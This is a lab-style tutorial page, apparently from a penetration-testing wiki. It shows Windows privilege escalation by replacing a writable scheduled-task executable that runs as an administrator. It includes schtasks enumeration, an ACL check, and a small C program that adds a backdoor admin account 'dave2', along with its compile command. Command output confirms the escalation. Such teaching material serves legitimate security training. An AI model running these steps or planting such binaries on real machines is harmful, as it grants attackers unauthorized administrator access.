---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Leveraging Scheduled Tasks

This example will walk through how to leverage insecure [Scheduled Tasks](../../core-concepts/task-scheduler.md) on a Windows machine.

When considering whether a task is exploitable three key questions must be asked/answered:

1. As which user account (principal) does this task get executed?
2. What triggers are specified for the task?
3. What actions are executed when triggered?

The first question is key for understanding whether a task could potentially lead to escalation of privileges. If the task is executed as the current user it does not really provide any value for escalation.&#x20;

The second question mainly pertains to the timeline for execution. If it is a job that runs once a year, while it may be an escalation vector, it is unlikely to be useful at the current moment.

The third question pertains to how the task will be exploited. These techniques will look similar to what was seen in the [abusing services](leveraging-services/) section; often it will entail either replacing the `.exe`, or perhaps a DLL, with some malicious code.

## Example

This example will pertain to a machine (`CLIENTWK220`) to which the attacker is assumed to have access via a compromised user account (`steve`). The attacker can use RDP to connect to the machine and run commands in PowerShell. The attacker is also assumed to have some mechanism for transporting files between the machines (either via HTTP/S or an RDP client).

Once connected to the machine the first step is to enumerate the scheduled tasks. This will be done with [schtasks query](../../core-concepts/task-scheduler.md#schtasks-query):

```powershell
PS C:\Users\steve> schtasks /query /fo LIST /v

Folder: \
HostName:                             CLIENTWK220
TaskName:                             \OneDrive Reporting Task-S-1-5-21-2309961351-4093026482-2223492918-1003
Next Run Time:                        12/28/2023 3:45:11 AM
Status:                               Ready
Logon Mode:                           Interactive only
Last Run Time:                        2/13/2023 2:45:45 AM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          %localappdata%\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe /reporting
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode
Run As User:                          steve
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 02:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        One Time Only, Hourly
Start Time:                           3:45:11 AM
Start Date:                           2/12/2023
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        24 Hour(s), 0 Minute(s)
Repeat: Until: Time:                  None
Repeat: Until: Duration:              Disabled
Repeat: Stop If Still Running:        Disabled

...

Folder: \Microsoft
HostName:                             CLIENTWK220
TaskName:                             \Microsoft\CacheCleanup
Next Run Time:                        12/27/2023 4:01:21 PM
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        12/27/2023 4:00:28 PM
Last Result:                          0
Author:                               CLIENTWK220\daveadmin
Task To Run:                          C:\Users\steve\Pictures\BackendCacheCleanup.exe
Start In:                             C:\Users\steve\Pictures
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode
Run As User:                          daveadmin
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: Disabled
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        One Time Only, Minute
Start Time:                           7:37:21 AM
Start Date:                           7/4/2022
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        0 Hour(s), 1 Minute(s)
Repeat: Until: Time:                  None
Repeat: Until: Duration:              Disabled
Repeat: Stop If Still Running:        Disabled

...
```

Consider the 3 questions above when looking for "interesting" tasks. The most important fields to consider will be `Author`, `TaskName`, `Task To Run`, `Run As User`, and `Next Run Time`.

With that in mind, the second task in the output copied above looks interesting. It runs every minute as daveadmin, and best of all, the executable is in a folder steve probably has access to. The following PowerShell (discussed in the [Manual Enumeration](../enumeration/manual-enumeration.md#folder-access) section) can be used to check the folder permissions:

```powershell
PS C:\Users\steve> $Folder = "C:\Users\steve\Pictures"
PS C:\Users\steve> $User = "steve"
PS C:\Users\steve> (Get-Acl $Folder).Access | ?{$_.IdentityReference -match $User} | Select IdentityReference,FileSystemRights

IdentityReference FileSystemRights
----------------- ----------------
CLIENTWK220\steve      FullControl
```

The output confirms that steve does indeed have full access to the folder where the task's executable lives.

From here the attacker can just replace the `C:\Users\steve\Pictures\BackendCacheCleanup.exe` binary with a malicious one. In this instance the `adduser.c` from previous examples will be compiled into the malicious binary.

```c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```

```bash
x86_64-w64-mingw32-gcc adduser.c -o BackendCacheCleanup.exe
```

It is then moved to the victim machine and used to replace the `BackendCacheCleanup.exe` file in `C:\Users\steve\Pictures`:

```powershell
PS C:\Users\steve> Copy-Item .\BackendCacheCleanup.exe .\Pictures\BackendCacheCleanup.exe
PS C:\Users\steve> net user

User accounts for \\CLIENTWK220

-------------------------------------------------------------------------------
Administrator            BackupAdmin              dave
daveadmin                DefaultAccount           Guest
offsec                   steve                    WDAGUtilityAccount
The command completed successfully.
```

The output of `net user` shows no `dave2`, indicating the Scheduled Task has not been executed. After waiting a minute and checking again the command reveals the `dave2` user has been created successfully:

```powershell
PS C:\Users\steve> net user

User accounts for \\CLIENTWK220

-------------------------------------------------------------------------------
Administrator            BackupAdmin              dave
dave2                    daveadmin                DefaultAccount
Guest                    offsec                   steve
WDAGUtilityAccount
The command completed successfully.

PS C:\Users\steve> net localgroup Administrators
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
BackupAdmin
dave2
daveadmin
offsec
The command completed successfully.
```

At this point the steps shown [here](leveraging-services/service-dll-hijacking.md#launching-elevated-shell) can be followed to launch an elevated PowerShell session.
